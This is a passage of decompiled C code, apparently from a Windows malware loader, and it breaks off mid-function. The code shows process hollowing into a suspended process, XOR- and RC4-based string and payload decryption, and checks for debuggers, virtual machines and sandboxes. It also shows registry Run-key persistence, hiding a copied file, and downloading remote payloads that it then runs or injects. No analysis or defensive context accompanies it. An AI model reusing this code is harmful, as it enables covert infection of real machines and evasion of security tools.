// 406180: using guessed type int (__stdcall *dword_406180)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00401CC4) --------------------------------------------------------
int __usercall sub_401CC4@<eax>(int a1@<ebx>, int a2, _WORD *a3)
{
  LPSTR CommandLineA; // eax
  FARPROC v5; // [esp+0h] [ebp-34Ch]
  int v6[17]; // [esp+4h] [ebp-348h] BYREF
  FARPROC v7; // [esp+48h] [ebp-304h]
  int v8; // [esp+4Ch] [ebp-300h]
  _WORD *v9; // [esp+50h] [ebp-2FCh]
  int v10; // [esp+54h] [ebp-2F8h] BYREF
  int i; // [esp+58h] [ebp-2F4h]
  int v12[179]; // [esp+5Ch] [ebp-2F0h] BYREF
  FARPROC ProcAddress; // [esp+328h] [ebp-24h]
  HANDLE hProcess; // [esp+32Ch] [ebp-20h] BYREF
  int v15; // [esp+330h] [ebp-1Ch]
  FARPROC v16; // [esp+33Ch] [ebp-10h]
  _DWORD *v17; // [esp+340h] [ebp-Ch]
  FARPROC v18; // [esp+344h] [ebp-8h]
  FARPROC v19; // [esp+348h] [ebp-4h]

  sub_403CBE(a1, (char *)v6, 0, 0x44u);
  v6[0] = 68;
  v12[0] = 65543;
  v9 = a3;
  if ( *a3 != 23117 )
    return 0;
  v8 = (int)a3 + *((_DWORD *)v9 + 15);
  if ( *(_DWORD *)v8 != 17744 )
    return 0;
  ProcAddress = GetProcAddress(dword_406140, &byte_405068);
  v5 = GetProcAddress(dword_406148, &byte_40509C);
  v19 = GetProcAddress(dword_406148, &byte_4050CC);
  v18 = GetProcAddress(dword_406148, &byte_4050E0);
  v7 = GetProcAddress(dword_406148, &byte_4050F4);
  v16 = GetProcAddress(dword_406148, &byte_4050B4);
  CommandLineA = GetCommandLineA();
  if ( !((int (__stdcall *)(int, LPSTR, _DWORD, _DWORD, _DWORD, int, _DWORD, _DWORD, int *, HANDLE *))ProcAddress)(
          a2,
          CommandLineA,
          0,
          0,
          0,
          4,
          0,
          0,
          v6,
          &hProcess) )
    return 0;
  ((void (__stdcall *)(HANDLE, _DWORD))v5)(hProcess, *(_DWORD *)(v8 + 52));
  if ( !dword_406180(hProcess, *(_DWORD *)(v8 + 52), *(_DWORD *)(v8 + 80), 12288, 64) )
    return 0;
  v10 = 0;
  ((void (__stdcall *)(HANDLE, _DWORD, _WORD *, _DWORD, int *))v16)(
    hProcess,
    *(_DWORD *)(v8 + 52),
    a3,
    *(_DWORD *)(v8 + 84),
    &v10);
  if ( !v10 )
    return 0;
  for ( i = 0; i < *(unsigned __int16 *)(v8 + 6); ++i )
  {
    v17 = (_DWORD *)((char *)&a3[20 * i + 124] + *((_DWORD *)v9 + 15));
    ((void (__stdcall *)(HANDLE, int, char *, _DWORD, _DWORD))v16)(
      hProcess,
      v17[3] + *(_DWORD *)(v8 + 52),
      (char *)a3 + v17[5],
      v17[4],
      0);
  }
  ((void (__stdcall *)(int, int *))v19)(v15, v12);
  ((void (__stdcall *)(HANDLE, int, int, int, _DWORD))v16)(hProcess, v12[41] + 8, v8 + 52, 4, 0);
  v12[44] = *(_DWORD *)(v8 + 40) + *(_DWORD *)(v8 + 52);
  ((void (__stdcall *)(int, int *))v18)(v15, v12);
  ((void (__stdcall *)(int, _DWORD))v7)(v15, 0);
  sub_401F61(hProcess);
  return 1;
}
// 406180: using guessed type int (__stdcall *dword_406180)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00401F61) --------------------------------------------------------
void __cdecl sub_401F61(HANDLE hProcess)
{
  LPCVOID Buffer; // [esp+4h] [ebp-84h] BYREF
  int v2; // [esp+8h] [ebp-80h]
  char v3[36]; // [esp+Ch] [ebp-7Ch] BYREF
  int v4; // [esp+30h] [ebp-58h]
  LPVOID v5; // [esp+34h] [ebp-54h]
  int v6; // [esp+54h] [ebp-34h]
  LPVOID v7; // [esp+58h] [ebp-30h]
  LPWSTR lpFilename; // [esp+5Ch] [ebp-2Ch]
  char v9[12]; // [esp+60h] [ebp-28h] BYREF
  LPCVOID lpBaseAddress; // [esp+6Ch] [ebp-1Ch]

  v6 = sub_4039DE((int)hProcess);
  if ( v6 )
  {
    Buffer = 0;
    v2 = 0;
    while ( ReadProcessMemory(hProcess, (LPCVOID)(v6 + 12), &Buffer, 4u, 0) )
    {
      if ( ReadProcessMemory(hProcess, Buffer, v9, 0x28u, 0) )
      {
        if ( ReadProcessMemory(hProcess, lpBaseAddress, v3, 0x48u, 0) )
        {
          lpFilename = (LPWSTR)sub_403CA5(0x208u);
          GetModuleFileNameW(0, lpFilename, 0x104u);
          LOWORD(v4) = 2 * lstrlenW(lpFilename);
          v7 = (LPVOID)dword_406180(hProcess, 0, (unsigned __int16)v4, 12288, 64);
          if ( v7 )
          {
            if ( WriteProcessMemory(hProcess, v7, lpFilename, (unsigned __int16)v4, 0) )
            {
              v5 = v7;
              WriteProcessMemory(hProcess, (LPVOID)lpBaseAddress, v3, 0x48u, 0);
            }
          }
        }
        return;
      }
      Sleep(5u);
      if ( v2 >= 600 )
        return;
      ++v2;
    }
  }
}
// 406180: using guessed type int (__stdcall *dword_406180)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 401F61: using guessed type char var_28[12];

//----- (004020C0) --------------------------------------------------------
char *__usercall sub_4020C0@<eax>(int a1@<ebx>, int a2, _DWORD *a3)
{
  int v4; // [esp+14h] [ebp-38h]
  int v5; // [esp+18h] [ebp-34h]
  int v6; // [esp+1Ch] [ebp-30h]
  int v7; // [esp+20h] [ebp-2Ch]
  int v8; // [esp+24h] [ebp-28h]
  FARPROC ProcAddress; // [esp+28h] [ebp-24h]
  FARPROC v10; // [esp+2Ch] [ebp-20h]
  FARPROC v11; // [esp+30h] [ebp-1Ch]
  _BYTE *v12; // [esp+34h] [ebp-18h]
  _BYTE *v13; // [esp+34h] [ebp-18h]
  FARPROC v14; // [esp+38h] [ebp-14h]
  int i; // [esp+3Ch] [ebp-10h]
  int j; // [esp+3Ch] [ebp-10h]
  int v17; // [esp+40h] [ebp-Ch]
  char *v18; // [esp+48h] [ebp-4h]

  ProcAddress = GetProcAddress(dword_406140, &byte_405130);
  v10 = GetProcAddress(dword_406140, asc_405140);
  v11 = GetProcAddress(dword_406140, &byte_405150);
  v14 = GetProcAddress(dword_406140, &byte_405160);
  for ( i = 1; ; ++i )
  {
    v12 = sub_403CA5(0xAu);
    sub_402AB1(i, v12, 10);
    v8 = ((int (__stdcall *)(_DWORD, _BYTE *, int))ProcAddress)(0, v12, a2);
    if ( !v8 )
      break;
    *a3 += ((int (__stdcall *)(_DWORD, int))v10)(0, v8);
    sub_403B92(v12);
  }
  if ( !*a3 )
    return 0;
  v18 = (char *)sub_403CA5(*a3 + 1);
  sub_403CBE(a1, v18, 0, *a3 + 1);
  v17 = 0;
  for ( j = 1; ; ++j )
  {
    v13 = sub_403CA5(0xAu);
    sub_402AB1(j, v13, 10);
    v7 = ((int (__stdcall *)(_DWORD, _BYTE *, int))ProcAddress)(0, v13, a2);
    if ( !v7 )
      break;
    v6 = ((int (__stdcall *)(_DWORD, int))v10)(0, v7);
    v4 = ((int (__stdcall *)(_DWORD, int))v11)(0, v7);
    if ( !v4 )
      break;
    v5 = ((int (__stdcall *)(int))v14)(v4);
    if ( !v5 )
      break;
    sub_403CF1(&v18[v17], v5, v6);
    v17 += v6;
    sub_403B92(v13);
  }
  return v18;
}

//----- (004022AB) --------------------------------------------------------
_BYTE *__cdecl sub_4022AB(int a1)
{
  int v2; // [esp+4h] [ebp-14h] BYREF
  LPVOID v3; // [esp+8h] [ebp-10h]
  int v4; // [esp+Ch] [ebp-Ch]
  int v5; // [esp+10h] [ebp-8h]
  int v6; // [esp+14h] [ebp-4h] BYREF

  v2 = 0;
  v3 = sub_403CA5(0x438u);
  v4 = 1743;
  v5 = 1074;
  v6 = 1081;
  if ( a1 )
  {
    if ( !dword_406158(-2147483646, &unk_405170, 0, 131097, &v2) )
    {
      if ( !dword_40615C(v2, 0, 0, 0, v3, &v6) )
      {
        dword_406160(v2);
        return sub_403C19((int)v3, asc_405514);
      }
      dword_406160(v2);
    }
    return 0;
  }
  else
  {
    if ( !dword_406158(0x80000000, &unk_4052D0, 0, 983103, &v2) )
    {
      if ( !dword_40615C(v2, 0, 0, 0, v3, &v6) )
      {
        dword_406160(v2);
        return sub_403C19((int)v3, asc_405518);
      }
      dword_406160(v2);
    }
    return 0;
  }
}
// 406158: using guessed type int (__stdcall *dword_406158)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 40615C: using guessed type int (__stdcall *dword_40615C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406160: using guessed type int (__stdcall *dword_406160)(_DWORD);

//----- (004023B7) --------------------------------------------------------
const char *sub_4023B7()
{
  const char *result; // eax
  const char *v1; // eax
  const CHAR *v2; // eax
  char *v3; // [esp+10h] [ebp-20h]
  unsigned int v4; // [esp+14h] [ebp-1Ch]
  char *v5; // [esp+18h] [ebp-18h]
  CHAR *lpString1; // [esp+1Ch] [ebp-14h]
  FARPROC ProcAddress; // [esp+20h] [ebp-10h]
  const char *lpString2; // [esp+24h] [ebp-Ch]
  const char *lpString2a; // [esp+24h] [ebp-Ch]
  char *v10; // [esp+28h] [ebp-8h]
  unsigned int v11; // [esp+2Ch] [ebp-4h]

  ProcAddress = GetProcAddress(dword_406150, &byte_4052C4);
  result = sub_403C19((int)byte_40573E, asc_40551C);
  lpString2 = result;
  if ( result )
  {
    v5 = (char *)sub_403CA5(0xAu);
    v10 = (char *)sub_403CA5(0xAu);
    lpString1 = (CHAR *)sub_403CA5(0x28u);
    v3 = (char *)sub_403CA5(0xFFu);
    sub_403C90(v5, lpString2);
    v1 = sub_403C19(0, asc_405520);
    sub_403C90(v10, v1);
    v2 = sub_403C19(0, asc_405524);
    lstrcpyA(lpString1, v2);
    lpString2a = sub_403C19(0, asc_405528);
    sub_403C90(v3, lpString2a);
    v11 = sub_403D13(v5);
    v4 = sub_403D13(v10);
    return (const char *)((int (__stdcall *)(_DWORD, char *, CHAR *, unsigned int))ProcAddress)(
                           0,
                           v3,
                           lpString1,
                           v4 + v11);
  }
  return result;
}

//----- (004024FF) --------------------------------------------------------
int sub_4024FF()
{
  int v0; // eax
  int result; // eax
  int v2; // eax
  int v3; // [esp+4h] [ebp-Ch] BYREF
  LPSTR lpString1; // [esp+8h] [ebp-8h]
  int v5; // [esp+Ch] [ebp-4h] BYREF

  if ( lstrcmpA(byte_405578, a0_0) )
  {
    if ( !dword_40613C || dword_405474 )
      dword_406164(-2147483647, &unk_4052E8, &v5);
    else
      dword_406164(-2147483646, &unk_4052E8, &v5);
    v0 = sub_403D24((int)dword_406130);
    dword_406168(v5, byte_405578, 0, 1, dword_406130, v0);
    return dword_406160(v5);
  }
  else
  {
    result = sub_403BF7(String1, a0_5);
    if ( result )
    {
      v3 = 0;
      lpString1 = (LPSTR)sub_403CA5(0x105u);
      lstrcpyA(lpString1, a5_0);
      sub_403BAC(lpString1, String1);
      if ( !dword_40613C || dword_405474 )
        dword_406164(-2147483647, lpString1, &v3);
      else
        dword_406164(-2147483646, lpString1, &v3);
      v2 = sub_403D24((int)dword_406130);
      dword_406168(v3, &unk_4051B4, 0, 1, dword_406130, v2);
      return dword_406160(v3);
    }
  }
  return result;
}
// 405474: using guessed type int dword_405474;
// 40613C: using guessed type int dword_40613C;
// 406160: using guessed type int (__stdcall *dword_406160)(_DWORD);
// 406164: using guessed type int (__stdcall *dword_406164)(_DWORD, _DWORD, _DWORD);
// 406168: using guessed type int (__stdcall *dword_406168)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00402656) --------------------------------------------------------
LPSTR __cdecl sub_402656(LPCSTR lpString1)
{
  CHAR *v2; // eax
  CHAR *v3; // eax
  CHAR *v4; // eax
  CHAR *v5; // eax
  FARPROC v6; // [esp+0h] [ebp-10h]
  FARPROC ProcAddress; // [esp+4h] [ebp-Ch]
  FARPROC v8; // [esp+8h] [ebp-8h]
  unsigned int dwMilliseconds; // [esp+Ch] [ebp-4h]

  ProcAddress = GetProcAddress(dword_406140, &byte_40539C);
  v8 = GetProcAddress(dword_406140, &byte_4053A8);
  v6 = GetProcAddress(dword_406140, asc_4053B4);
  dwMilliseconds = 1000 * sub_403D13(byte_406124);
  if ( sub_403BF7(byte_4055F1, a1_2) && lstrcmpA(byte_4055F1, a2_0) )
  {
    dword_406138 = 0;
    return (LPSTR)lpString1;
  }
  if ( !dword_40613C || dword_405474 )
    goto LABEL_12;
  if ( !lstrcmpA(byte_4055F3, asc_405350) )
  {
    v2 = sub_403BCE(asc_405364);
    lstrcpyA(dword_406130, v2);
    goto LABEL_13;
  }
  if ( !lstrcmpA(byte_4055F3, asc_405354) )
  {
    v3 = sub_403BCE(asc_405364);
    lstrcpyA(dword_406130, v3);
    sub_403BAC(dword_406130, asc_405370);
    goto LABEL_13;
  }
  if ( lstrcmpA(byte_4055F3, a5U9) )
  {
LABEL_12:
    v5 = sub_403BCE(&byte_405384);
    sub_403C90(dword_406130, v5);
  }
  else
  {
    v4 = sub_403BCE(&byte_40537C);
    lstrcpyA(dword_406130, v4);
  }
LABEL_13:
  sub_403BAC(dword_406130, asc_40553C);
  sub_403BAC(dword_406130, byte_4055C8);
  if ( lstrcmpA(lpString1, dword_406130) )
  {
    if ( sub_403BF7(byte_4055F1, a1_3) )
      ((void (__stdcall *)(LPCSTR, LPSTR, _DWORD))v8)(lpString1, dword_406130, 0);
    else
      ((void (__stdcall *)(LPCSTR, LPSTR, int))ProcAddress)(lpString1, dword_406130, 3);
    if ( !lstrcmpA(byte_4055F7, a1_0) )
      ((void (__stdcall *)(LPSTR, int))v6)(dword_406130, 2);
    if ( lstrcmpA(byte_40573E, a0_1) )
      sub_4023B7();
    if ( dwMilliseconds )
      Sleep(dwMilliseconds);
    sub_4024FF();
    if ( dwMilliseconds == -1000 )
      ExitProcess(0);
    dword_406138 = 1;
    return dword_406130;
  }
  else
  {
    dword_406138 = 0;
    return (LPSTR)lpString1;
  }
}
// 405474: using guessed type int dword_405474;
// 406138: using guessed type int dword_406138;
// 40613C: using guessed type int dword_40613C;

//----- (0040291D) --------------------------------------------------------
int sub_40291D()
{
  FARPROC v1; // [esp+0h] [ebp-20h]
  FARPROC ProcAddress; // [esp+4h] [ebp-1Ch]
  int v3[2]; // [esp+8h] [ebp-18h] BYREF
  char v4[8]; // [esp+10h] [ebp-10h] BYREF
  FARPROC v5; // [esp+18h] [ebp-8h]
  int v6; // [esp+1Ch] [ebp-4h] BYREF

  v3[1] = 3286;
  ProcAddress = GetProcAddress(hModule, &byte_405424);
  if ( !ProcAddress )
    return 1;
  v5 = GetProcAddress(hModule, &byte_405440);
  if ( !v5 )
    return 1;
  v1 = GetProcAddress(hModule, &byte_405458);
  if ( !v1 )
    return 1;
  v4[0] = 0;
  v4[1] = 0;
  v4[2] = 0;
  v4[3] = 0;
  v4[4] = 0;
  v4[5] = 5;
  if ( !((int (__stdcall *)(char *, int, int, int, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, int *))ProcAddress)(
          v4,
          2,
          32,
          544,
          0,
          0,
          0,
          0,
          0,
          0,
          v3) )
    return 0;
  v6 = 0;
  if ( !((int (__stdcall *)(_DWORD, int, int *))v5)(0, v3[0], &v6) )
    v6 = 0;
  ((void (__stdcall *)(int))v1)(v3[0]);
  return v6;
}

//----- (00402A17) --------------------------------------------------------
BOOL sub_402A17()
{
  int v1; // [esp+4h] [ebp-10h] BYREF
  int v2; // [esp+8h] [ebp-Ch] BYREF
  int v3; // [esp+Ch] [ebp-8h]
  int v4; // [esp+10h] [ebp-4h] BYREF

  v1 = 0;
  v4 = 4;
  v3 = dword_406158(-2147483646, &unk_4053DC, 0, 1, &v1);
  if ( v3 )
    return v3 == 5;
  if ( dword_40615C(v1, &unk_405418, 0, 0, &v2, &v4) )
  {
    dword_406160(v1);
    return 0;
  }
  else
  {
    dword_406160(v1);
    return v2 != 0;
  }
}
// 406158: using guessed type int (__stdcall *dword_406158)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 40615C: using guessed type int (__stdcall *dword_40615C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406160: using guessed type int (__stdcall *dword_406160)(_DWORD);

//----- (00402AB1) --------------------------------------------------------
_BYTE *__cdecl sub_402AB1(int a1, _BYTE *a2, int a3)
{
  int v4; // [esp+0h] [ebp-1Ch]
  char *v5; // [esp+4h] [ebp-18h]
  char v6; // [esp+8h] [ebp-14h]
  _BYTE *v7; // [esp+14h] [ebp-8h]
  char *i; // [esp+14h] [ebp-8h]
  int v9; // [esp+18h] [ebp-4h]

  if ( a3 >= 2 && a3 <= 16 )
  {
    v7 = a2;
    v4 = a1;
    do
    {
      v9 = v4 % a3;
      if ( v4 % a3 < 0 )
        v9 = -v9;
      *v7++ = byte_405460[v9];
      v4 /= a3;
    }
    while ( v4 );
    if ( a1 < 0 && a3 == 10 )
      *v7++ = 45;
    MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
    MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
    *v7 = 0;
    v5 = a2;
    for ( i = v7 - 1; v5 < i; --i )
    {
      v6 = *v5;
      *v5 = *i;
      *i = v6;
      ++v5;
    }
    return a2;
  }
  else
  {
    *a2 = 0;
    return a2;
  }
}

//----- (00402BB2) --------------------------------------------------------
int sub_402BB2()
{
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  __asm { vpcext  7, 0Bh }
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  return 1;
}

//----- (00402CA0) --------------------------------------------------------
BOOL sub_402CA0()
{
  return GetModuleHandleA(ModuleName)
      || GetModuleHandleA(asc_4051CC)
      || GetModuleHandleA(a5_1)
      || GetModuleHandleA(a0_2)
      || GetModuleHandleA(asc_4051F4);
}

//----- (00402CF9) --------------------------------------------------------
int sub_402CF9()
{
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxA(HWND_MESSAGE|0x2, 0, 0, 0);
  __indword(0x5658u);
  return 0;
}
// 402DF0: conditional instruction was optimized away because %var_24.4==8685D465

//----- (00402E0C) --------------------------------------------------------
BOOL sub_402E0C()
{
  HANDLE CurrentProcess; // eax
  int v2[3]; // [esp+14h] [ebp-Ch] BYREF

  if ( IsDebuggerPresent() )
    return 1;
  v2[0] = 0;
  v2[2] = 7;
  v2[1] = 4327;
  CurrentProcess = GetCurrentProcess();
  dword_40617C(CurrentProcess, 7, v2, 4, 0);
  return v2[0] != 0;
}
// 40617C: using guessed type int (__stdcall *dword_40617C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (00402E83) --------------------------------------------------------
int sub_402E83()
{
  int v1; // [esp+4h] [ebp-Ch] BYREF
  __int16 v2; // [esp+8h] [ebp-8h]
  int i; // [esp+Ch] [ebp-4h]

  v2 = 4841;
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  for ( i = 0; i < 5000000; ++i )
  {
    v1 = 7844;
    sub_403B92(&v1);
  }
  return 0;
}

//----- (00402ED9) --------------------------------------------------------
int __cdecl sub_402ED9(int a1, int a2, unsigned int a3, unsigned int a4)
{
  unsigned __int8 v5; // [esp+4h] [ebp-410h]
  unsigned __int8 v6; // [esp+4h] [ebp-410h]
  unsigned int k; // [esp+8h] [ebp-40Ch]
  int v8; // [esp+Ch] [ebp-408h]
  int i; // [esp+10h] [ebp-404h]
  int j; // [esp+10h] [ebp-404h]
  int v11[256]; // [esp+14h] [ebp-400h]

  v8 = 0;
  for ( i = 0; i < 256; ++i )
    v11[i] = i;
  for ( j = 0; j < 256; ++j )
  {
    v8 = (*(unsigned __int8 *)(a2 + j % a4) + v11[j] + v8) % 256;
    v5 = v11[j];
    v11[j] = v11[v8];
    v11[v8] = v5;
  }
  for ( k = 0; k < a3; ++k )
  {
    j = (j + 1) % 256;
    v8 = (v11[j] + v8) % 256;
    v6 = v11[j];
    v11[j] = v11[v8];
    v11[v8] = v6;
    *(_BYTE *)(k + a1) ^= LOBYTE(v11[(v11[v8] + v11[j]) % 256]);
  }
  return a1;
}
// 402ED9: using guessed type int var_400[256];

//----- (004030E9) --------------------------------------------------------
int sub_4030E9()
{
  sub_40349F((int)&byte_405068, 14);
  sub_40349F((int)&byte_40509C, 20);
  sub_40349F((int)&byte_4050B4, 20);
  sub_40349F((int)&byte_4050CC, 18);
  sub_40349F((int)&byte_4050E0, 18);
  sub_40349F((int)&byte_4050F4, 14);
  sub_40349F((int)&byte_405120, 14);
  sub_40349F((int)&byte_405130, 13);
  sub_40349F((int)asc_405140, 14);
  sub_40349F((int)&byte_405150, 12);
  sub_40349F((int)&byte_405160, 12);
  sub_40349F((int)&ProcName, 13);
  sub_40349F((int)&byte_405274, 16);
  sub_40349F((int)&unk_4052D0, 23);
  sub_40349F((int)&byte_405288, 13);
  sub_40349F((int)&byte_405298, 14);
  sub_40349F((int)&byte_4052A8, 11);
  sub_40349F((int)&unk_4052E8, 45);
  sub_40349F((int)a5_0, 53);
  sub_40349F((int)asc_405364, 10);
  sub_40349F((int)asc_405370, 9);
  sub_40349F((int)&byte_40539C, 11);
  sub_40349F((int)&byte_4053A8, 9);
  sub_40349F((int)asc_4053B4, 18);
  sub_40349F((int)&byte_405104, 25);
  sub_40349F((int)&byte_405200, 13);
  sub_40349F((int)&byte_405210, 16);
  sub_40349F((int)&byte_405224, 16);
  sub_40349F((int)&byte_405238, 19);
  sub_40349F((int)LibFileName, 12);
  sub_40349F((int)a5, 12);
  sub_40349F((int)asc_405030, 9);
  sub_40349F((int)asc_40505C, 11);
  sub_40349F((int)a7Pav8, 10);
  sub_40349F((int)&unk_4053C8, 16);
  sub_40349F((int)&byte_4052C4, 11);
  sub_40349F((int)&unk_405390, 8);
  sub_40349F((int)asc_405258, 11);
  sub_40349F((int)asc_4052B4, 13);
  sub_40349F((int)asc_405350, 3);
  sub_40349F((int)asc_405354, 3);
  sub_40349F((int)a5U9, 3);
  sub_40349F((int)&a5U9[4], 2);
  sub_40349F((int)a0_4, 2);
  sub_40349F((int)&byte_405384, 3);
  sub_40349F((int)&byte_40537C, 7);
  sub_40349F((int)a7C, 4);
  sub_40349F((int)&unk_4053DC, 57);
  sub_40349F((int)&unk_405418, 9);
  sub_40349F((int)ModuleName, 11);
  sub_40349F((int)asc_4051CC, 11);
  sub_40349F((int)a5_1, 11);
  sub_40349F((int)a0_2, 13);
  sub_40349F((int)asc_4051F4, 11);
  sub_40349F((int)&unk_405170, 64);
  sub_40349F((int)&unk_4051B4, 8);
  sub_40349F((int)&byte_405424, 24);
  sub_40349F((int)&byte_405440, 20);
  sub_40349F((int)&byte_405458, 7);
  sub_40349F((int)&byte_405084, 11);
  sub_40349F((int)&byte_405090, 9);
  sub_40349F((int)&byte_405078, 11);
  return sub_40349F((int)byte_405460, 16);
}

//----- (0040349F) --------------------------------------------------------
int __cdecl sub_40349F(int a1, int a2)
{
  int result; // eax
  int i; // [esp+0h] [ebp-4h]

  for ( i = 0; i <= a2; ++i )
  {
    *(_BYTE *)(i + a1) ^= String[i % dword_40612C];
    result = i + 1;
  }
  return result;
}
// 40612C: using guessed type int dword_40612C;

//----- (004034E3) --------------------------------------------------------
int __usercall StartAddress@<eax>(int a1@<ebx>)
{
  int result; // eax
  CHAR *v2; // eax
  CHAR *v3; // eax
  CHAR *v4; // eax
  CHAR *v5; // eax
  int v6; // [esp+8h] [ebp-34h]
  CHAR *lpString1; // [esp+Ch] [ebp-30h]
  int j; // [esp+10h] [ebp-2Ch] BYREF
  SIZE_T dwBytes; // [esp+14h] [ebp-28h] BYREF
  LPVOID v10; // [esp+18h] [ebp-24h]
  int v11; // [esp+1Ch] [ebp-20h]
  int v12; // [esp+20h] [ebp-1Ch]
  FARPROC v13; // [esp+24h] [ebp-18h]
  int v14; // [esp+28h] [ebp-14h]
  int i; // [esp+2Ch] [ebp-10h]
  FARPROC v16; // [esp+30h] [ebp-Ch]
  FARPROC v17; // [esp+34h] [ebp-8h]
  FARPROC ProcAddress; // [esp+38h] [ebp-4h]

  ProcAddress = GetProcAddress(dword_40614C, &byte_405200);
  v16 = GetProcAddress(dword_40614C, &byte_405210);
  v17 = GetProcAddress(dword_40614C, &byte_405224);
  v13 = GetProcAddress(dword_40614C, &byte_405238);
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  MessageBoxW(HWND_MESSAGE|0x2, 0, 0, 0);
  result = ((int (__stdcall *)(_DWORD, int, _DWORD, _DWORD, _DWORD))ProcAddress)(0, 1, 0, 0, 0);
  v14 = result;
  if ( result )
  {
    for ( i = 0; i < 5; ++i )
    {
      result = sub_403BF7(&byte_4058DC[424 * i], a0_6);
      if ( !result )
        return result;
      if ( dword_406138 || lstrcmpA(&byte_405A82[424 * i], a0_3) && sub_403BF7(&byte_405A82[424 * i], a1_4) )
      {
        v12 = ((int (__stdcall *)(int, CHAR *, _DWORD, _DWORD, _DWORD, _DWORD))v16)(
                v14,
                &byte_4058DC[424 * i],
                0,
                0,
                0,
                0);
        if ( !v12 )
          return ((int (__stdcall *)(int))v13)(v14);
        v10 = sub_403CA5(0x400u);
        v11 = 0;
        dwBytes = 0;
        for ( j = 0; ; sub_403CF1((_BYTE *)(dwBytes - j + v11), (int)v10, j) )
        {
          ((void (__stdcall *)(int, LPVOID, int, int *))v17)(v12, v10, 1023, &j);
          if ( !j )
            break;
          dwBytes += j;
          v11 = (int)sub_403AE0(a1, v11, dwBytes, dwBytes - j);
        }
        if ( sub_403BF7((char *)&unk_405954 + 424 * i, &a5U9[4]) )
        {
          if ( lstrcmpA((LPCSTR)&unk_405954 + 424 * i, a0_4) )
          {
            if ( lstrcmpiA((LPCSTR)&unk_405954 + 424 * i, asc_405354)
              && lstrcmpiA((LPCSTR)&unk_405954 + 424 * i, asc_405350)
              && lstrcmpiA((LPCSTR)&unk_405954 + 424 * i, &byte_405384)
              && lstrcmpiA((LPCSTR)&unk_405954 + 424 * i, a5U9) )
            {
              sub_401CC4(a1, (int)&unk_405954 + 424 * i, (_WORD *)v11);
            }
            else
            {
              lpString1 = (CHAR *)sub_403CA5(0x105u);
              if ( lstrcmpiA((LPCSTR)&unk_405954 + 424 * i, asc_405354) )
              {
                if ( lstrcmpiA((LPCSTR)&unk_405954 + 424 * i, asc_405350) )
                {
                  if ( lstrcmpiA((LPCSTR)&unk_405954 + 424 * i, &byte_405384) )
                  {
                    if ( !lstrcmpiA((LPCSTR)&unk_405954 + 424 * i, a5U9) )
                    {
                      v5 = sub_403BCE(a5U9);
                      lstrcpyA(lpString1, v5);
                    }
                  }
                  else
                  {
                    v4 = sub_403BCE(&byte_405384);
                    sub_403C90(lpString1, v4);
                  }
                }
                else
                {
                  v3 = sub_403BCE(asc_405364);
                  sub_403C90(lpString1, v3);
                }
              }
              else
              {
                v2 = sub_403BCE(asc_405364);
                sub_403C90(lpString1, v2);
                lstrcatA(lpString1, asc_405558);
                lstrcatA(lpString1, asc_405370);
              }
              sub_403BAC(lpString1, asc_40555C);
              sub_403BAC(lpString1, (const char *)&unk_40597D + 424 * i);
              result = dword_406170(lpString1, 0x40000000, 0, 0, 2, 0, 0);
              v6 = result;
              if ( result == -1 )
                return result;
              dword_406174(result, v11, dwBytes, &dwBytes, 0);
              dword_406178(v6);
              if ( sub_403BF7(&byte_405A82[424 * i], a1_5) && lstrcmpA(&byte_405A82[424 * i], a3) )
                dword_40616C(0, a7C, lpString1, 0, 0, 0);
              else
                dword_40616C(0, a7C, lpString1, 0, 0, 1);
            }
          }
          else
          {
            sub_401CC4(a1, (int)::lpString1, (_WORD *)v11);
          }
        }
        else
        {
          sub_401CC4(a1, (int)lpString2, (_WORD *)v11);
        }
      }
    }
    return ((int (__stdcall *)(int))v13)(v14);
  }
  return result;
}
// 406138: using guessed type int dword_406138;
// 40616C: using guessed type int (__stdcall *dword_40616C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406170: using guessed type int (__stdcall *dword_406170)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406174: using guessed type int (__stdcall *dword_406174)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 406178: using guessed type int (__stdcall *dword_406178)(_DWORD);

//----- (004039DE) --------------------------------------------------------
int __cdecl sub_4039DE(int a1)
{
  char v2[4]; // [esp+0h] [ebp-18h] BYREF
  int v3; // [esp+4h] [ebp-14h]

  dword_40617C(a1, 0, v2, 24, 0);
  return v3;
}
// 40617C: using guessed type int (__stdcall *dword_40617C)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 4039DE: using guessed type char var_18[4];

//----- (00403AE0) --------------------------------------------------------
_BYTE *__usercall sub_403AE0@<eax>(int a1@<ebx>, int a2, SIZE_T dwBytes, int a4)
{
  _BYTE *v5; // [esp+Ch] [ebp-4h]

  if ( !a2 )
    return sub_403CA5(dwBytes);
  if ( a4 == dwBytes )
    return (_BYTE *)a2;
  v5 = sub_403CA5(dwBytes);
  if ( !v5 )
    return 0;
  if ( dwBytes <= a4 )
  {
    sub_403CF1(v5, a2, dwBytes);
  }
  else
  {
